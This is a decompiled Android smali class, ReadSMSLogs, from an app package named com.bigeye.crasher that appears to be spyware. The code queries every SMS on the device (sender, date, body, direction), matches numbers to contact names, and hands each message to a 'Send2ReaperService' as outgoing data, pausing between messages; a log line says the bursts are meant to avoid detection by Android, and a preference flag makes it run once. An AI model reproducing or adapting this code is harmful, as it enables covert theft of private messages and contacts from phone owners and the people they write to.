.class public Lcom/bigeye/crasher/ReadSMSLogs;
.super Landroid/app/IntentService;
.source "ReadSMSLogs.java"


# static fields
.field private static final SLEEP_TIME:J = 0x1388L


# instance fields
.field private final APP_TAG:Ljava/lang/String;

.field final prefName:Ljava/lang/String;

.field sharedPrefs:Landroid/content/SharedPreferences;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 23
    const-string v0, "Read SMS Logs"

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    .line 16
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/bigeye/crasher/ReadSMSLogs;->APP_TAG:Ljava/lang/String;

    .line 20
    const-string v0, "Sync"

    iput-object v0, p0, Lcom/bigeye/crasher/ReadSMSLogs;->prefName:Ljava/lang/String;

    .line 25
    return-void
.end method


# virtual methods
.method public GetSMSLogs()V
    .locals 21

    .prologue
    .line 61
    const/4 v2, 0x5

    new-array v4, v2, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v3, "address"

    aput-object v3, v4, v2

    const/4 v2, 0x1

    const-string v3, "date"

    aput-object v3, v4, v2

    const/4 v2, 0x2

    const-string v3, "body"

    aput-object v3, v4, v2

    const/4 v2, 0x3

    const-string v3, "type"

    aput-object v3, v4, v2

    const/4 v2, 0x4

    const-string v3, "read"

    aput-object v3, v4, v2

    .line 62
    .local v4, "projection":[Ljava/lang/String;
    const/4 v5, 0x0

    .line 63
    .local v5, "selection":Ljava/lang/String;
    const/4 v6, 0x0

    .line 64
    .local v6, "selectionArgs":[Ljava/lang/String;
    const/4 v7, 0x0

    .line 65
    .local v7, "sortOrder":Ljava/lang/String;
    const/4 v10, 0x0

    .line 68
    .local v10, "cursor":Landroid/database/Cursor;
    :try_start_0
    invoke-virtual/range {p0 .. p0}, Lcom/bigeye/crasher/ReadSMSLogs;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    const-string v3, "content://sms"

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    invoke-virtual/range {v2 .. v7}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v10

    .line 71
    invoke-interface {v10}, Landroid/database/Cursor;->getCount()I

    move-result v2

    if-gtz v2, :cond_0

    .line 72
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/bigeye/crasher/ReadSMSLogs;->APP_TAG:Ljava/lang/String;

    const-string v3, "SMS logs empty"

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 73
    invoke-interface {v10}, Landroid/database/Cursor;->close()V

    .line 131
    :goto_0
    return-void

    .line 76
    :cond_0
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/bigeye/crasher/ReadSMSLogs;->APP_TAG:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v19, "found "

    move-object/from16 v0, v19

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-interface {v10}, Landroid/database/Cursor;->getCount()I

    move-result v19

    move/from16 v0, v19

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v19, " records"

    move-object/from16 v0, v19

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 79
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/bigeye/crasher/ReadSMSLogs;->APP_TAG:Ljava/lang/String;

    const-string v3, "about to start sending logs in 10 secs bursts - so as to avoid detection by android system!"

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 81
    :goto_1
    invoke-interface {v10}, Landroid/database/Cursor;->moveToNext()Z

    move-result v2

    if-eqz v2, :cond_4

    .line 83
    const/4 v2, 0x0

    aget-object v2, v4, v2

    invoke-interface {v10, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {v10, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v14

    .line 84
    .local v14, "phoneNo":Ljava/lang/String;
    const/4 v2, 0x1

    aget-object v2, v4, v2

    invoke-interface {v10, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {v10, v2}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v2

    invoke-static {v2, v3}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v11

    .line 85
    .local v11, "date":Ljava/lang/Long;
    const/4 v2, 0x2

    aget-object v2, v4, v2

    invoke-interface {v10, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {v10, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v16

    .line 88
    .local v16, "smsContent":Ljava/lang/String;
    const/4 v2, 0x3

    aget-object v2, v4, v2

    invoke-interface {v10, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {v10, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v18

    .line 91
    .local v18, "type":Ljava/lang/String;
    const/4 v2, 0x4

    aget-object v2, v4, v2

    invoke-interface {v10, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {v10, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v15

    .line 93
    .local v15, "read":Ljava/lang/String;
    const-string v8, ""

    .line 94
    .local v8, "SMSLogStr":Ljava/lang/String;
    new-instance v2, Landroid/text/format/DateFormat;

    invoke-direct {v2}, Landroid/text/format/DateFormat;-><init>()V

    const-string v2, "dd-MMM-yyyy k:m:s"

    invoke-virtual {v11}, Ljava/lang/Long;->longValue()J

    move-result-wide v19

    move-wide/from16 v0, v19

    invoke-static {v2, v0, v1}, Landroid/text/format/DateFormat;->format(Ljava/lang/CharSequence;J)Ljava/lang/CharSequence;

    move-result-object v2

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v17

    .line 97
    .local v17, "tmp_dt":Ljava/lang/String;
    new-instance v2, Lcom/bigeye/crasher/ReadContacts;

    invoke-virtual/range {p0 .. p0}, Lcom/bigeye/crasher/ReadSMSLogs;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-direct {v2, v3}, Lcom/bigeye/crasher/ReadContacts;-><init>(Landroid/content/Context;)V

    invoke-virtual {v2, v14}, Lcom/bigeye/crasher/ReadContacts;->getContactName(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    .line 98
    .local v13, "name":Ljava/lang/String;
    const-string v2, ""

    if-eq v13, v2, :cond_2

    .line 100
    :goto_2
    const-string v2, "1"

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_3

    .line 101
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "sms from <"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, ">"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 106
    :cond_1
    :goto_3
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, ": "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    move-object/from16 v0, v16

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, ":"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    move-object/from16 v0, v17

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 107
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/bigeye/crasher/ReadSMSLogs;->APP_TAG:Ljava/lang/String;

    invoke-static {v2, v8}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 111
    :try_start_1
    new-instance v2, Ljava/lang/Thread;

    invoke-direct {v2}, Ljava/lang/Thread;-><init>()V

    const-wide/16 v2, 0x1388

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 117
    :goto_4
    :try_start_2
    new-instance v9, Landroid/content/Intent;

    invoke-virtual/range {p0 .. p0}, Lcom/bigeye/crasher/ReadSMSLogs;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-class v3, Lcom/bigeye/crasher/Send2ReaperService;

    invoke-direct {v9, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 118
    .local v9, "SvcIntent":Landroid/content/Intent;
    const-string v2, "OPERATION"

    const-string v3, "OUTGOING"

    invoke-virtual {v9, v2, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 119
    const-string v2, "MSG"

    invoke-virtual {v9, v2, v8}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 120
    move-object/from16 v0, p0

    invoke-virtual {v0, v9}, Lcom/bigeye/crasher/ReadSMSLogs;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto/16 :goto_1

    .line 127
    .end local v8    # "SMSLogStr":Ljava/lang/String;
    .end local v9    # "SvcIntent":Landroid/content/Intent;
    .end local v11    # "date":Ljava/lang/Long;
    .end local v13    # "name":Ljava/lang/String;
    .end local v14    # "phoneNo":Ljava/lang/String;
    .end local v15    # "read":Ljava/lang/String;
    .end local v16    # "smsContent":Ljava/lang/String;
    .end local v17    # "tmp_dt":Ljava/lang/String;
    .end local v18    # "type":Ljava/lang/String;
    :catch_0
    move-exception v12

    .line 128
    .local v12, "e":Ljava/lang/Exception;
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/bigeye/crasher/ReadSMSLogs;->APP_TAG:Ljava/lang/String;

    invoke-virtual {v12}, Ljava/lang/Exception;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_0

    .line 98
    .end local v12    # "e":Ljava/lang/Exception;
    .restart local v8    # "SMSLogStr":Ljava/lang/String;
    .restart local v11    # "date":Ljava/lang/Long;
    .restart local v13    # "name":Ljava/lang/String;
    .restart local v14    # "phoneNo":Ljava/lang/String;
    .restart local v15    # "read":Ljava/lang/String;
    .restart local v16    # "smsContent":Ljava/lang/String;
    .restart local v17    # "tmp_dt":Ljava/lang/String;
    .restart local v18    # "type":Ljava/lang/String;
    :cond_2
    :try_start_3
    const-string v13, "unknown"

    goto/16 :goto_2

    .line 102
    :cond_3
    const-string v2, "2"

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    .line 103
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "sms to <"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, ">"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    goto/16 :goto_3

    .line 112
    :catch_1
    move-exception v12

    .line 114
    .local v12, "e":Ljava/lang/InterruptedException;
    invoke-virtual {v12}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto :goto_4

    .line 125
    .end local v8    # "SMSLogStr":Ljava/lang/String;
    .end local v11    # "date":Ljava/lang/Long;
    .end local v12    # "e":Ljava/lang/InterruptedException;
    .end local v13    # "name":Ljava/lang/String;
    .end local v14    # "phoneNo":Ljava/lang/String;
    .end local v15    # "read":Ljava/lang/String;
    .end local v16    # "smsContent":Ljava/lang/String;
    .end local v17    # "tmp_dt":Ljava/lang/String;
    .end local v18    # "type":Ljava/lang/String;
    :cond_4
    invoke-interface {v10}, Landroid/database/Cursor;->close()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    goto/16 :goto_0
.end method

.method protected onHandleIntent(Landroid/content/Intent;)V
    .locals 7
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    const/4 v6, 0x0

    .line 31
    const-string v3, "Sync"

    invoke-virtual {p0, v3, v6}, Lcom/bigeye/crasher/ReadSMSLogs;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    iput-object v3, p0, Lcom/bigeye/crasher/ReadSMSLogs;->sharedPrefs:Landroid/content/SharedPreferences;

    .line 32
    iget-object v3, p0, Lcom/bigeye/crasher/ReadSMSLogs;->sharedPrefs:Landroid/content/SharedPreferences;

    const-string v4, "smsLogsSynced"

    invoke-interface {v3, v4, v6}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    .line 33
    .local v2, "smsLogsSynced":Z
    iget-object v3, p0, Lcom/bigeye/crasher/ReadSMSLogs;->sharedPrefs:Landroid/content/SharedPreferences;

    const-string v4, "LastSMSLogsSyncDate"

    const-string v5, "NULL"

    invoke-interface {v3, v4, v5}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 35
    .local v1, "lastSyncDate":Ljava/lang/String;
    if-eqz v2, :cond_0

    .line 36
    iget-object v3, p0, Lcom/bigeye/crasher/ReadSMSLogs;->APP_TAG:Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "SMS Logs had been synced. Date: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 39
    iget-object v3, p0, Lcom/bigeye/crasher/ReadSMSLogs;->APP_TAG:Ljava/lang/String;

    const-string v4, "commiting suicide"

    invoke-static {v3, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 40
    invoke-virtual {p0}, Lcom/bigeye/crasher/ReadSMSLogs;->stopSelf()V

    .line 50
    :goto_0
    const-string v3, "Sync"

    invoke-virtual {p0, v3, v6}, Lcom/bigeye/crasher/ReadSMSLogs;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    iput-object v3, p0, Lcom/bigeye/crasher/ReadSMSLogs;->sharedPrefs:Landroid/content/SharedPreferences;

    .line 51
    iget-object v3, p0, Lcom/bigeye/crasher/ReadSMSLogs;->sharedPrefs:Landroid/content/SharedPreferences;

    invoke-interface {v3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 52
    .local v0, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v3, "smsLogsSynced"

    const/4 v4, 0x1

    invoke-interface {v0, v3, v4}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 53
    const-string v3, "LastSMSLogsSyncDate"

    invoke-static {}, Ljava/text/DateFormat;->getDateTimeInstance()Ljava/text/DateFormat;

    move-result-object v4

    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v5

    invoke-virtual {v5}, Ljava/util/Calendar;->getTime()Ljava/util/Date;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/text/DateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v4

    invoke-interface {v0, v3, v4}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 54
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 56
    iget-object v3, p0, Lcom/bigeye/crasher/ReadSMSLogs;->APP_TAG:Ljava/lang/String;

    const-string v4, "finse"

    invoke-static {v3, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 57
    invoke-virtual {p0}, Lcom/bigeye/crasher/ReadSMSLogs;->stopSelf()V

    .line 58
    return-void

    .line 42
    .end local v0    # "editor":Landroid/content/SharedPreferences$Editor;
    :cond_0
    iget-object v3, p0, Lcom/bigeye/crasher/ReadSMSLogs;->APP_TAG:Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "SMS Logs have NEVER been synced. Date: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 45
    iget-object v3, p0, Lcom/bigeye/crasher/ReadSMSLogs;->APP_TAG:Ljava/lang/String;

    const-string v4, "About to start fetching all SMS logs: standby "

    invoke-static {v3, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 46
    invoke-virtual {p0}, Lcom/bigeye/crasher/ReadSMSLogs;->GetSMSLogs()V

    goto :goto_0
.end method
